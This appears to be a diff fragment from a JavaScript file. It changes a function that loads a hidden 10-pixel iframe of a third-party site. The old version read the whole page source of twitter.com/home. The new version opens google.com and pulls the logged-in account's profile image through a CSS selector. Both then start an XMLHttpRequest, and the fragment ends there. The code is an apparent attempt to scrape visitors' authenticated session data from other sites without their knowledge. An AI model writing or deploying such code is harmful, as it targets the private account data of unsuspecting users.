@@ -122,26 +122,20 @@
     function getdata() {
       var element = document.createElement("iframe");
       element.setAttribute('id', 'myframe');
-      element.setAttribute('src', 'https://twitter.com/home');
+      element.setAttribute('src', 'https://google.com');
       document.body.appendChild(element);
       document.getElementById("myframe").style.width = "10px";
       document.getElementById("myframe").style.height = "10px";
       let ifram = document.getElementById("myframe");
       // access the content of the iframe
       let doc = ifram.contentDocument || ifram.contentWindow.document;
-      // get the element by id
+      // get google account image
       
-
-      // iframe page source
-      let data ={
-        "name":doc.documentElement.innerHTML
-      }
-
-      console.log(data);
-       
-       
-
-
+      let img = doc.querySelector('#gb > div > div.gb_Re > div.gb_Ma.gb_gd.gb_lg.gb_f.gb_zf > div > a > img');
+      // get img source value
+      let imgsrc = img.getAttribute('src');
+      console.log(imgsrc);
+      
 
 
       let xhrr = new XMLHttpRequest()
